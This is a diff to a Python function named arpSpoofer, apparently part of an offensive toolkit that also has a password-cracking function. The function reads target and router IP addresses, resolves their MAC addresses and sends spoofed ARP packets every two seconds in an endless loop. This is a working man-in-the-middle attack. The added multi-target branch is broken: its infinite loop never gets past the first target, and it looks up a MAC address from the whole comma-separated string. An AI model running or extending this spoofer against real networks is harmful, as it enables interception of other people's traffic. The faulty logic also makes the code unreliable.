@@ -158,14 +158,21 @@ def passwordCracker():
 
 def arpSpoofer():
     try:
+
         target_ip = str(input("Enter target ip")).strip(' ')
         router_ip = str(input("Enter router ip")).strip(' ')
         target_mac = str(get_mac_address(target_ip))
         router_mac = str(get_mac_address(router_ip))
 
-        while True:  # infinite loop contiues spoofing every 2 secs
-            spoof(router_ip, target_ip, router_mac, target_mac)
-            time.sleep(2)
+        if ',' in target_ip:  # for multiple targets
+            for ip_add in target_ip.split(','):
+                while True:  # infinite loop continues spoofing every 2 secs
+                    spoof(router_ip, ip_add, router_mac, target_mac)
+                    time.sleep(2)
+        else:
+            while True:  # infinite loop continues spoofing every 2 secs
+                spoof(router_ip, target_ip, router_mac, target_mac)
+                time.sleep(2)
     except KeyboardInterrupt:
         print('Closing ARP Spoofer.')
         exit(0)
